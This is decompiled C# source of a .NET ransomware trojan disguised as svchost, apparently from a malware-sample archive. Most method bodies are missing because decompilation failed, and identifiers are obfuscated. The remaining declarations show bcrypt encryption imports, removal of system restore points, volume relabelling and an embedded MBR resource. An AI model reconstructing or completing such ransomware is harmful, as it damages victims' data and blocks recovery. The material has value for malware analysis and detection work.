// Decompiled with JetBrains decompiler
// Type: Loki.ZZF
// Assembly: svchost, Version=2.1.0.0, Culture=neutral, PublicKeyToken=1033239b79792944
// MVID: AC1C84B8-A285-45A1-BF48-BDF83760C093
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.12-msil\HEUR-Trojan-Ransom.Win32.Generic-f2da3d1410c5058720a4307acf5fec7fc2b54285be9dd89eae108cce368dcde7.exe

using Loki.Pinvoke;
using Loki.Properties;
using System;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using ZZZZZZZZZZZZz;
using ZZZZZZZZZZZZZA;
using ZZZZZZZZZZZZZC;
using ZZZZZZZZZZZZZx;

namespace Loki
{
  internal class ZZF
  {
    [ZZZZZZZZZZl(-766329410)]
    internal static ZZZZZZZZZZZZZy \u002Fnì\u0090\u00B1;
    [ZZZZZZZZZZw(89832573)]
    internal static ZZZZZZZZZZZZA \u0080\u005Ct\u005Ei;
    [ZZZZZZZZH(-617600986)]
    internal static ZZZZZZZZZZZZZB ó\u0008U\u00818;
    [ZZZZZZZZZr(549256047)]
    internal static ZZZZZZZZZZZZZD \u0020Õ\u008Eb\u00A6;

    public static Image ZZZl(IntPtr _param0)
    {
      // ISSUE: unable to decompile the method.
    }

    public static void ZZZm(string _param0, string _param1, string _param2 = null)
    {
      // ISSUE: unable to decompile the method.
    }

    public ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    static ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    public ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    static ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    public static void ZZZR()
    {
      // ISSUE: unable to decompile the method.
    }

    public ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    static ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    internal ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    [SpecialName]
    internal static ResourceManager get_ResourceManager()
    {
      if (Koi.ZZZZh == null)
        Koi.ZZZZh = new ResourceManager("Loki.Properties.ZZZZg", typeof (ZZZZg).Assembly);
      return Koi.ZZZZh;
    }

    [SpecialName]
    internal static CultureInfo get_Culture() => Koi.ZZZZi;

    [SpecialName]
    internal static void set_Culture(CultureInfo value) => Koi.ZZZZi = value;

    [SpecialName]
    internal static Icon get__lock() => (Icon) ZZF.get_ResourceManager().GetObject("_lock", Koi.ZZZZi);

    [SpecialName]
    internal static string get_info_min() => ZZF.get_ResourceManager().GetString("info_min", Koi.ZZZZi);

    [SpecialName]
    internal static byte[] get_MBR() => (byte[]) ZZF.get_ResourceManager().GetObject("MBR", Koi.ZZZZi);

    [SpecialName]
    internal static string get_update() => ZZF.get_ResourceManager().GetString("update", Koi.ZZZZi);

    public static bool ZZZZq(IntPtr _param0, int _param1)
    {
      // ISSUE: unable to decompile the method.
    }

    public static bool ZZZZr(
      IntPtr _param0,
      int _param1,
      IntPtr _param2,
      IntPtr _param3,
      IntPtr _param4,
      IntPtr _param5)
    {
      // ISSUE: unable to decompile the method.
    }

    public ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    static ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [DllImport("bcrypt.dll", EntryPoint = "BCryptCloseAlgorithmProvider")]
    public static extern int ZZZZu(IntPtr _param0, int _param1);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptOpenAlgorithmProvider", CharSet = CharSet.Unicode)]
    public static extern int ZZZZv(
      out IntPtr _param0,
      string _param1,
      string _param2,
      uint _param3);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptGenRandom")]
    public static extern int ZZZZw(IntPtr _param0, IntPtr _param1, int _param2, uint _param3);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptEncrypt")]
    public static extern int ZZZZx(
      IntPtr _param0,
      IntPtr _param1,
      int _param2,
      [In] ref ZZZZt.ZZZZE _param3,
      IntPtr _param4,
      int _param5,
      IntPtr _param6,
      int _param7,
      out int _param8,
      uint _param9);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptDecrypt")]
    public static extern int ZZZZy(
      IntPtr _param0,
      IntPtr _param1,
      int _param2,
      [In] ref ZZZZt.ZZZZE _param3,
      IntPtr _param4,
      int _param5,
      IntPtr _param6,
      int _param7,
      out int _param8,
      uint _param9);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty", CharSet = CharSet.Unicode)]
    public static extern int ZZZZz(
      IntPtr _param0,
      string _param1,
      [MarshalAs(UnmanagedType.LPArray), In] byte[] _param2,
      int _param3,
      uint _param4);

    [DllImport("bcrypt.dll", EntryPoint = "BCryptGenerateSymmetricKey")]
    internal static extern int ZZZZA(
      IntPtr _param0,
      out IntPtr _param1,
      IntPtr _param2,
      int _param3,
      IntPtr _param4,
      int _param5,
      int _param6);

    [SecurityCritical]
    [SecuritySafeCritical]
    internal static void ZZZZB(ref ZZZZt.ZZZZE _param0)
    {
      // ISSUE: unable to decompile the method.
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [DllImport("bcrypt.dll", EntryPoint = "BCryptDestroyKey")]
    public static extern int ZZZZC(IntPtr _param0);

    public ZZF()
    {
      // ISSUE: unable to decompile the method.
    }

    [DllImport("SrClient.dll", EntryPoint = "SRRemoveRestorePoint", SetLastError = true)]
    public static extern uint ZZZZT(uint _param0);

    [DllImport("Kernel32.dll", EntryPoint = "SetVolumeLabelA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool ZZZZU(string _param0, string _param1);

    [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
    public static extern IntPtr ZZZZV();

    [DllImport("user32.dll", EntryPoint = "GetWindowRect", SetLastError = true)]
    public static extern bool ZZZZW(IntPtr _param0, out ZZZZS.ZZZZZZK _param1);
  }
}
